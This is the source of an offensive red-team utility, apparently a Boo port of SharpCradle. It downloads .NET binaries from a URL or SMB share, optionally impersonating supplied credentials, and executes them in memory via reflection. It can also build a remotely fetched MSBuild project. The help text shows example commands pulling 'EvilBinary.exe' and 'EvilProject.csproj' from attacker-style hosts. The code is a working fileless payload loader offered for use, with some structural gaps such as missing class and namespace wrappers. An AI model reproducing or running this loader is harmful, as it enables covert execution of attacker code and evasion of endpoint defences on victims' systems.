
/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

import System
import System.IO
import System.Linq
import System.Net
import System.Reflection

	private static def Main(args as (string)):
		bin as (byte)
		br as BinaryReader
		cmd as (object)
		try:
			if ((args.Length <= 0) or (args[0] == 'help')) or (args[0] == '?'):
				help()
			elif args[0] == '-f':
				domain = '.\\'
				uname = 'anonymous'
				password = ''
				folderPathToBinary as string = args[1]
				cmd = args.Skip(2).ToArray()
				if (args[0] == '-f') & (args[1] == '-c'):
					domain = args[2]
					uname = args[3]
					password = args[4]
					folderPathToBinary = args[5]
					cmd = args.Skip(6).ToArray()
				using Impersonation(domain, uname, password):
					fs = FileStream(folderPathToBinary, FileMode.Open)
					br = BinaryReader(fs)
					bin = br.ReadBytes(Convert.ToInt32(fs.Length))
					fs.Close()
					br.Close()
					loadAssembly(bin, cmd)
			elif args[0] == '-w':
				cmd = args.Skip(2).ToArray()
				ms = MemoryStream()
				using client = WebClient():
					System.Net.ServicePointManager.SecurityProtocol = ((System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11) | System.Net.SecurityProtocolType.Tls12)
					ms = MemoryStream(client.DownloadData(args[1]))
					br = BinaryReader(ms)
					bin = br.ReadBytes(Convert.ToInt32(ms.Length))
					ms.Close()
					br.Close()
					loadAssembly(bin, cmd)
			elif args[0] == '-p':
				proj as var = System.Xml.XmlReader.Create(args[1])
				msbuild as var = Microsoft.Build.Evaluation.Project(proj)
				msbuild.Build()
				proj.Close()
		except :
			Console.WriteLine('Something went wrong! Check parameters and make sure binary uses managed code')

	public static def loadAssembly(bin as (byte), commands as (object)):
		a as Assembly = Assembly.Load(bin)
		try:
			a.EntryPoint.Invoke(null, (of object: commands))
		except :
			method as MethodInfo = a.EntryPoint
			if method is not null:
				o as object = a.CreateInstance(method.Name)
				method.Invoke(o, null)

	public static def help():
		Console.WriteLine()
		Console.WriteLine()
		Console.WriteLine('How to use SharpCradle')
		Console.WriteLine('======================')
		Console.WriteLine()
		Console.WriteLine()
		Console.WriteLine('Download .NET binary from web')
		Console.WriteLine('-----------------------------')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -w https://192.168.1.10/EvilBinary.exe')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -w https://github.com/public/EvilBinary.exe?raw=true <arguments to pass to EvilBinary.exe>')
		Console.WriteLine()
		Console.WriteLine()
		Console.WriteLine('Download .NET binary from file share anonymously')
		Console.WriteLine('------------------------------------')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -f \\\\192.168.1.10\\MyShare\\EvilBinary.exe')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -f \\\\ComputerName\\MyShare\\EvilBinary.exe <arguments to pass to EvilBinary.exe>')
		Console.WriteLine()
		Console.WriteLine()
		Console.WriteLine('Download .NET binary from file share with credentials')
		Console.WriteLine('-----------------------------------------------------')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -f -c domain username password \\\\192.168.1.10\\MyShare\\EvilBinary.exe')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -f -c domain username password \\\\ComputerName\\MyShare\\EvilBinary.exe <arguments to pass to EvilBinary.exe>')
		Console.WriteLine()
		Console.WriteLine()
		Console.WriteLine('Download .NET inline project file from web')
		Console.WriteLine('-----------------------------------------------------')
		Console.WriteLine()
		Console.WriteLine('c:\\> SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj')
		Console.WriteLine()
		Console.WriteLine()

//End Program
//End Namespace
